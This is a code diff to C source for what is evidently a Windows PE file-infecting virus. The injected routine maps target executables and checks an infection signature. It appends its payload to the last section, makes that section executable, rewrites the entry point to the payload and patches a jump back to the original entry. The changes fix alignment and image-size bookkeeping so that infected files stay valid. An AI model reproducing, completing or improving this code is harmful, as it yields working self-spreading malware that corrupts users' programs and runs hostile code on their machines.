@@ -78,11 +78,12 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
     HANDLE hFile, hMapFile;
     LPVOID pMapAddress;
-    DWORD dwFileSize, dwSignature;
+    DWORD dwFileSize, dwNewFileSize, dwSignature;
     PCIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
-    DWORD dwPayloadPtr, dwOrigEntryPoint, dwNewEntryPoint;
+    DWORD dwOrigEntryPoint, dwOrigRawSize, dwSizeAligned;
+    PBYTE pPayloadData;
 
     do {
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -108,9 +109,12 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         }
 
         dwFileSize = pGetFileSize(hFile, NULL);
+        dwNewFileSize = PG_ALIGN_UP(dwFileSize + PG_ALIGN_UP(code_size, 512), 512);
+        // ^ TODO: Get file alignment from PE header instead of hardcoding 512
+        //         Load file in read-only mode and reopen in RW later
+        //         Perform as many checks as possible in read-only mode
 
-        hMapFile =
-            pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwFileSize + code_size, NULL);
+        hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
         if (hMapFile == NULL) {
             // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
             goto close_file;
@@ -136,26 +140,34 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
         pLastSection = &pSection[pNtHeader->FileHeader.NumberOfSections - 1];
-        dwPayloadPtr = pLastSection->PointerToRawData + pLastSection->SizeOfRawData;
-        dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwPayloadPtr -
+        dwOrigRawSize = pLastSection->SizeOfRawData;
+        pPayloadData = (PBYTE)pDosHeader + pLastSection->PointerToRawData + dwOrigRawSize;
+        dwSignature = *(PCDWORD)(pPayloadData -
                                  ((PCBYTE)&code_size - (PCBYTE)&signature + sizeof(code_size)));
         if (dwSignature == signature) {
             goto error;
         }
 
         dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
-        dwNewEntryPoint = pLastSection->VirtualAddress + pLastSection->SizeOfRawData;
 
-        pLastSection->Misc.VirtualSize += code_size;
-        pLastSection->SizeOfRawData += code_size;
-        pNtHeader->OptionalHeader.SizeOfCode += code_size;
-        pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
-        pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
+        dwSizeAligned = PG_ALIGN_UP(code_size, pNtHeader->OptionalHeader.FileAlignment);
+        // ^ Compute aligned size earlier
+        pLastSection->Misc.VirtualSize = dwOrigRawSize + code_size;
+        pLastSection->SizeOfRawData += dwSizeAligned;
+        pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
+                                                    ? dwSizeAligned
+                                                    : pLastSection->SizeOfRawData;
+        pNtHeader->OptionalHeader.SizeOfImage =
+            PG_ALIGN_UP(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize,
+                        pNtHeader->OptionalHeader.SectionAlignment);
+        pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
+        pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
+        pNtHeader->OptionalHeader.AddressOfEntryPoint =
+            pLastSection->VirtualAddress + dwOrigRawSize;
 
-        my_memcpy((PBYTE)pMapAddress + dwPayloadPtr, (PCBYTE)payload, code_size);
-        *(PLONGLONG)((PCBYTE)pMapAddress + dwPayloadPtr +
-                     ((PCBYTE)&delta_start - (PCBYTE)&payload)) =
-            (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
+        my_memcpy(pPayloadData, (PCBYTE)payload, code_size);
+        *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&payload)) =
+            (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
 
         pFlushViewOfFile(pMapAddress, 0);
         goto unmap;
